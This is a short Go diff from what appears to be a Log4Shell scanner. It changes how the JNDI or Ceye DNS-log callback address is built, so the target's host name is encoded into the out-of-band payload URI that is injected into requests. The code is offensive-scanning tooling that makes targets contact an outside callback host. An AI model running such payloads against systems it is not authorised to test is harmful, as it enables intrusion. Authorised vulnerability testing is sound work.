@@ -11,7 +11,11 @@ import (
 
 func Check(u string, finalURL string) bool {
 	if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
-		randomstr := pkg.RandomStr() + "log4j"
+		var host = "null"
+		randomstr := pkg.RandomStr()
+		if ux, err := url.Parse(u); err == nil {
+			host = strings.Replace(ux.Host, ":", ".", -1)
+		}
 		domainx, intputs := getinputurl(finalURL)
 		domainx = append(domainx, u)
 		intputs = append(intputs, "x")
@@ -21,7 +25,7 @@ func Check(u string, finalURL string) bool {
 				if jndi.JndiAddress != "" {
 					uri = jndi.JndiAddress + "/" + randomstr + "/"
 				} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-					uri = randomstr + "." + pkg.CeyeDomain
+					uri = randomstr + "." + host + "." + pkg.CeyeDomain
 				}
 				payload = strings.Replace(payload, "dnslog-url", uri, -1)
 				header := make(map[string]string)
